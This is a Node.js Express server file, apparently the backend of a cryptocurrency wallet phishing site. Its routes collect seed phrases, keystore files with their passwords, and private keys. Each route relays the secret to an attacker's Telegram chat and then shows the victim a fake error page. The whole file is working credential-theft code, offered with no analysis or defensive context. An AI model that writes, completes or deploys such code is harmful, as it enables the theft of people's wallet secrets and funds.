const express = require("express")
const path = require("path")
const { Telegraf } = require('telegraf')
const fs = require("fs")
require('dotenv').config()

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

const bot = new Telegraf(process.env.BOT_TOKEN)

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.get("/connect", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/connect.html"))
})

app.post("/import-phrase", async (req, res) => {
    try {
      bot.telegram.sendMessage(process.env.chatID, req.body.phrase)
    }catch(err) {
        console.log(err)
    }
    res.redirect("/error")
})

app.post("/import-keystore", async (req, res) => {
  try {
    bot.telegram.sendMessage(process.env.chatID, req.body.keystore_json)
    bot.telegram.sendMessage(process.env.chatID, req.body.keystore_pass)
  }catch(err) {
      console.log(err)
  }
  res.redirect("/error")
})

app.post("/import-private", async (req, res) => {
  try {
    bot.telegram.sendMessage(process.env.chatID, req.body.private_key)
  }catch(err) {
      console.log(err)
  }
  res.redirect("/error")
})

app.post("/user", async (req, res) => {
  console.log(req.body)

  res.redirect("/")
})

app.get("/error", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/error.html"))
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))

bot.launch()